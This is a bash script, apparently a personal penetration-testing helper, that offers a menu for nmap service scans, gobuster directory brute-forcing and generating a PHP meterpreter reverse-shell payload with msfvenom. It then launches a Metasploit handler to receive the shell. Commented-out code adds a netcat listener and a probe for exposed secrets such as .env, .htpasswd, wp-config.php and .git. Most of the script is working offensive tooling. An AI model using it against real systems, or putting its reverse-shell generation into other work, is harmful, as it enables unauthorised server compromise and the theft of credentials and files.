#!/bin/bash

peform_nmap_scan() {
  echo "Performing nmap scan..."

  read -p "Target ip address: " target_ip

  sudo nmap -sC -sV -vv $target_ip >>results.txt
  echo "Scan done successfully! ..."
  cat results.txt
}

peform_web_search() {
  echo "Performing web search..."
  read -p "Target website: " target_website

  gobuster dir -u $target_website -w /opt/url_wordlist >>web_search.txt
  echo "Done searching directories"

  # curl https://$target_website_ip:80/ | grep href >>web_curl.txt

  # ./whatweb -v $target_website >>web_results.txt
}

# peform_web_banner_scanner() {
#   read -p "target"
#   curl
# }

peform_banner_grab() {
  read -p ' website'
  ./whatweb -v $target_website
}

generate_php_shell() {
  echo "generating php shell..."
  read -p "Enter Your Ip: " ip
  read -p "Enter Your Port Number: " port

  msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw >>shell.php
  echo "Successfully generated shell..."

  start_metasploit_handler_php
}

start_metasploit_handler_php() {
  echo "Starting metasploit handler..."
  msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run"
}

# start_netcat_listener() {
#   echo 'starting netcat listener'
#   read -p "Enter port number: " port_number

#   nc -lnvp $port_number
# }

echo "Choose the type of Nmap scan:" # Prompt user for the type of scan
echo "1. Nmap scan on target"
echo "2. Web directory scan on target"
echo "3. Generate a web shell"
read -p "Enter your choice: " choice

case $choice in
1) peform_nmap_scan ;;
2) peform_web_search ;;
3) generate_php_shell ;;
*) echo "Invalid choice. Exiting." ;;
esac

# Check if dirsearch is installed
# check_dirsearch() {
#   if ! command -v dirsearch &>/dev/null; then
#     echo "Dirsearch is not installed. Installing..."
#     sudo apt update
#     sudo apt install -y dirsearch
#   fi
# }

# Check if sslscan is installed
# check_nmap() {
#   if ! command -v dirsearch &>/dev/null; then
#     echo "Dirsearch is not installed. Installing..."
#     sudo apt update
#     sudo apt install -y dirsearch
#   fi
# }

# run_dirsearch() {

# }

# run_metasploit(){

# }

# # Function to check if a file exists on the website
# check_file() {
#   url="$1"
#   file="$2"
#   status_code=$(curl -o /dev/null -s -w "%{http_code}" "${url}${file}")

#   if [ "$status_code" -eq "200" ]; then
#     echo "Found: ${url}${file}"
#     echo "${url}${file}" >>found_files.txt
#     found_files=1
#   fi
# }

# # Prompt the user for the target website URL
# read -p "Enter the target website URL: " target_url

# # Ensure the URL ends with a slash
# if [[ "${target_url: -1}" != "/" ]]; then
#   target_url="$target_url/"
# fi

# # Expanded list of files and directories to search for
# files_to_search=("robots.txt" "sitemap.xml" ".DS_Store" ".htaccess" ".htpasswd" ".git" ".svn" "wp-config.php" "wp-admin" "wp-includes" "wp-content" "readme.html" "xmlrpc.php" ".env" "config.php" "phpinfo.php" ".idea" ".dockerignore" "Dockerfile" ".editorconfig" ".eslintignore" ".eslintrc" ".gitattributes" ".gitignore" ".gitmodules" ".hgignore" ".hgtags" ".npmignore" ".npmrc" ".nvmrc" ".prettierignore" ".prettierrc" ".styleci.yml" ".stylelintignore" ".stylelintrc" ".travis.yml" ".yarnrc" "package.json" "package-lock.json" "yarn.lock" "composer.json" "composer.lock" "server-status")

# # Check for each file on the website
# found_files=0
# echo "Searching for files in $target_url..."

# # Remove the previous results file if it exists
# rm -f found_files.txt

# for file in "${files_to_search[@]}"; do
#   check_file "$target_url" "$file"
# done

# # Display a message if no files were found
# if [ "$found_files" -eq "0" ]; then
#   echo "No specified files were found."
# else
#   echo "Results have been saved in found_files.txt"
# fi
